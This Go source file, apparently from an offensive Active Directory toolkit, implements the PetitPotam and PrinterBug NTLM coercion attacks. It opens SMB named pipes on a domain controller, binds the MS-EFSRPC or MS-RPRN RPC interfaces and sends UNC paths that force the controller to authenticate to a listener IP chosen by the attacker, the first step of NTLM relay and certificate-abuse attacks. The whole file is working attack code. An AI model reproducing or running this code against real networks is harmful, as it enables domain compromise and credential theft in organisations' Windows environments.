package pki

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"
)

// CoerceMethod identifies the NTLM authentication coercion technique.
type CoerceMethod string

const (
	CoercePetitPotam CoerceMethod = "PetitPotam" // MS-EFSRPC EfsRpcOpenFileRaw
	CoercePrinterBug CoerceMethod = "PrinterBug" // MS-RPRN RpcRemoteFindFirstPrinterChangeNotification
)

// CoerceNTLMAuth triggers an NTLM authentication from a target machine to a
// listener IP using the specified coercion method.
func CoerceNTLMAuth(targetDC, listenerIP string, listenerPort int, method CoerceMethod, cfg *ADCSConfig) error {
	switch method {
	case CoercePetitPotam:
		return petitPotam(targetDC, listenerIP, listenerPort)
	case CoercePrinterBug:
		return printerBug(targetDC, listenerIP, cfg)
	default:
		return fmt.Errorf("unknown coercion method: %s", method)
	}
}

// MS-EFSRPC interface UUID: c681d488-d850-11d0-8c52-00c04fd90f7e v1.0
var efsrpcUUID = [16]byte{
	0x88, 0xd4, 0x81, 0xc6, 0x50, 0xd8, 0xd0, 0x11,
	0x8c, 0x52, 0x00, 0xc0, 0x4f, 0xd9, 0x0f, 0x7e,
}

// MS-RPRN interface UUID: 12345678-1234-ABCD-EF00-0123456789AB v1.0
var rprnUUID = [16]byte{
	0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xCD, 0xAB,
	0xEF, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB,
}

func petitPotam(targetDC, listenerIP string, listenerPort int) error {
	if listenerPort > 0 {
		fmt.Printf("[*] PetitPotam: Triggering NTLM auth from %s to %s:%d (WebDAV/HTTP)\n", targetDC, listenerIP, listenerPort)
	} else {
		fmt.Printf("[*] PetitPotam: Triggering NTLM auth from %s to %s (SMB/445)\n", targetDC, listenerIP)
	}

	conn, err := net.DialTimeout("tcp", targetDC+":445", 10*time.Second)
	if err != nil {
		return fmt.Errorf("connect to %s:445: %w", targetDC, err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	s := &smbSession{conn: conn}

	if err := s.negotiate(); err != nil {
		return fmt.Errorf("SMB negotiate: %w", err)
	}
	if err := s.sessionSetupAnonymous(); err != nil {
		return fmt.Errorf("SMB session setup: %w", err)
	}
	if err := s.treeConnect(targetDC, "IPC$"); err != nil {
		return fmt.Errorf("SMB tree connect IPC$: %w", err)
	}

	pipes := []string{"efsrpc", "lsarpc", "lsass", "netlogon", "samr"}
	var pipeErr error
	for _, pipeName := range pipes {
		if err := s.createPipe(pipeName); err != nil {
			pipeErr = err
			continue
		}
		fmt.Printf("[+] Opened pipe: \\pipe\\%s\n", pipeName)

		if err := rpcBind(s, efsrpcUUID); err != nil {
			pipeErr = fmt.Errorf("RPC bind on %s: %w", pipeName, err)
			continue
		}

		var uncPath string
		if listenerPort > 0 {
			uncPath = fmt.Sprintf(`\\%s@%d\share\file.txt`, listenerIP, listenerPort)
		} else {
			uncPath = fmt.Sprintf(`\\%s\share\file.txt`, listenerIP)
		}
		if err := efsRpcOpenFileRaw(s, uncPath); err != nil {
			pipeErr = fmt.Errorf("EfsRpcOpenFileRaw: %w", err)
			continue
		}

		fmt.Printf("[+] PetitPotam: Coercion sent — %s should authenticate to %s\n", targetDC, listenerIP)
		return nil
	}

	return fmt.Errorf("PetitPotam failed on all pipes: %w", pipeErr)
}

func printerBug(targetDC, listenerIP string, cfg *ADCSConfig) error {
	if cfg == nil {
		return fmt.Errorf("PrinterBug requires credentials (cfg is nil)")
	}
	fmt.Printf("[*] PrinterBug: Triggering NTLM auth from %s to \\\\%s\\share\n", targetDC, listenerIP)

	conn, err := net.DialTimeout("tcp", targetDC+":445", 10*time.Second)
	if err != nil {
		return fmt.Errorf("connect to %s:445: %w", targetDC, err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	s := &smbSession{conn: conn}

	if err := s.negotiate(); err != nil {
		return fmt.Errorf("SMB negotiate: %w", err)
	}

	if cfg.Kerberos {
		if err := s.sessionSetupKerberos(cfg, targetDC); err != nil {
			return fmt.Errorf("SMB Kerberos auth: %w", err)
		}
		fmt.Printf("[+] SMB2 Kerberos session established (authenticated as %s)\n", cfg.Username)
	} else {
		if err := s.sessionSetupNTLM(cfg); err != nil {
			return fmt.Errorf("SMB NTLM auth: %w", err)
		}
		fmt.Printf("[+] SMB2 session established (authenticated as %s)\n", cfg.Username)
	}

	if err := s.treeConnect(targetDC, "IPC$"); err != nil {
		return fmt.Errorf("SMB tree connect IPC$: %w", err)
	}

	if err := s.createPipe("spoolss"); err != nil {
		return fmt.Errorf("open \\pipe\\spoolss: %w", err)
	}

	if err := rpcBind(s, rprnUUID); err != nil {
		return fmt.Errorf("RPC bind MS-RPRN: %w", err)
	}

	printerName := fmt.Sprintf(`\\%s`, targetDC)
	handle, err := rpcOpenPrinterEx(s, printerName)
	if err != nil {
		return fmt.Errorf("RpcOpenPrinterEx: %w", err)
	}

	captureUNC := fmt.Sprintf(`\\%s\share`, listenerIP)
	if err := rpcFindFirstPrinterChangeNotificationEx(s, handle, captureUNC); err != nil {
		fmt.Printf("[!] RpcRemoteFindFirstPrinterChangeNotificationEx returned error: %v\n", err)
		return nil
	}

	fmt.Printf("[+] PrinterBug: Coercion sent — %s should authenticate to \\\\%s\\share\n", targetDC, listenerIP)
	return nil
}

func parseOpenPrinterExResponse(resp []byte) ([]byte, error) {
	rpcData, err := extractRPCFromReadResponse(resp)
	if err != nil {
		return nil, fmt.Errorf("extract RPC data: %w", err)
	}

	if len(rpcData) < 24 {
		return nil, fmt.Errorf("RPC response too short")
	}

	pktType := rpcData[2]
	if pktType == 0x03 {
		return nil, fmt.Errorf("RPC fault")
	}
	if pktType != 0x02 {
		return nil, fmt.Errorf("unexpected RPC packet type")
	}

	stub := rpcData[24:]
	if len(stub) < 24 {
		return nil, fmt.Errorf("RPC response stub too short")
	}

	retVal := binary.LittleEndian.Uint32(stub[20:24])
	if retVal != 0 {
		return nil, fmt.Errorf("RpcOpenPrinterEx failed: 0x%08X", retVal)
	}

	handle := make([]byte, 20)
	copy(handle, stub[0:20])
	return handle, nil
}
